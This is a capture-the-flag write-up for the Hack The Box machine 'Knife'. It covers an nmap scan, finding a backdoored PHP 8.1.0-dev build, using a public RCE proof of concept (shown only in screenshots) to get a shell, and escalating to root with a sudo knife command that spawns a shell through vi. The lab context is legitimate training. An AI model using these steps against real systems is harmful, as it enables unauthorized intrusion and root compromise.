# HTB-knife

As always, started with Nmap and didn't find anything too useful, only ports 22 and 80 are open.

```bash
# Nmap 7.94SVN scan initiated Sun Feb 18 13:08:20 2024 as: nmap -p- -Pn -A -T4 -sC -oN nmap.txt 10.129.24.143
Nmap scan report for 10.129.24.143
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 18 13:08:43 2024 -- 1 IP address (1 host up) scanned in 22.82 seconds
```

The website itself was also pretty bare-bones.

I decided to run Nikto against the website, as I saw it was running PHP, and I wanted to find the version.

Nikto revealed that the website was running PHP version: PHP/8.1.0-dev

<figure><img src=".gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

Going off that as my only lead, I was able to find a vulnerability for this version of PHP. This [Github ](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)link provided me with an unauthenticated RCE.

I grabbed this POC script first

<figure><img src=".gitbook/assets/image (192).png" alt="" width="563"><figcaption></figcaption></figure>

Then fired off the command on my end and got a shell.

<figure><img src=".gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

Which then led me to getting my first flag.

<figure><img src=".gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

The shell I was in wasn't great. Luckily back on that Github for the POC, there was another script for a reverse shell, so I grabbed that, ran it, and got a much better shell.

<figure><img src=".gitbook/assets/image (195).png" alt="" width="563"><figcaption></figcaption></figure>

Running the command

```bash
sudo -l
```

Showed me I had sudo in /usr/bin/knife

<figure><img src=".gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Knife tool provides an interface to manage Chef automation server nodes, cookbooks, recipes and etc. Knife usage can be read from [manpage](https://manpages.ubuntu.com/manpages/bionic/man1/knife.1.html). Some examples shows that, it is possible to edit knife data bags using a text editor. We can try that.

```bash
sudo knife data bag create 1 2 -e vi
```

This opens up the vim editor. We type below in the editor to get a shell as root.

```bash
:!/bin/sh
```

<figure><img src=".gitbook/assets/image (197).png" alt="" width="366"><figcaption></figcaption></figure>
